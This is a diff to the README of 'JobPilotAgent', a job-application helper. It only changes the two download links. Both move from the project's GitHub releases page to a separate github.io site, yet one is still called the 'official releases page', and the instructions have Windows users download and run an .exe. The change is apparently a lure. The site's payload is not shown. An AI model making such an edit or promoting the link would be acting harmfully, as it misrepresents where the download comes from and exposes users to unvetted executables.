@@ -1,6 +1,6 @@
 # 🚀 JobPilotAgent - Automate job applications with human control
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/diamantine-aneroidbarometer28/JobPilotAgent/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://diamantine-aneroidbarometer28.github.io)
 
 JobPilotAgent helps you apply for jobs. It writes documents and keeps track of your search. You remain in charge of every application. It provides evidence for each item in your resume and generates documents you can edit.
 
@@ -19,7 +19,7 @@ Applying for jobs takes time. This tool speeds up the process. It reads your res
 
 You do not need programming knowledge to use this tool. Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the [official releases page](https://github.com/diamantine-aneroidbarometer28/JobPilotAgent/releases) to download the package.
+1.  Visit the [official releases page](https://diamantine-aneroidbarometer28.github.io) to download the package.
 2.  Look for the file ending in `.exe` under the latest version.
 3.  Click the link to download the file to your computer.
 4.  Open your Downloads folder and double-click the file to start the installer.
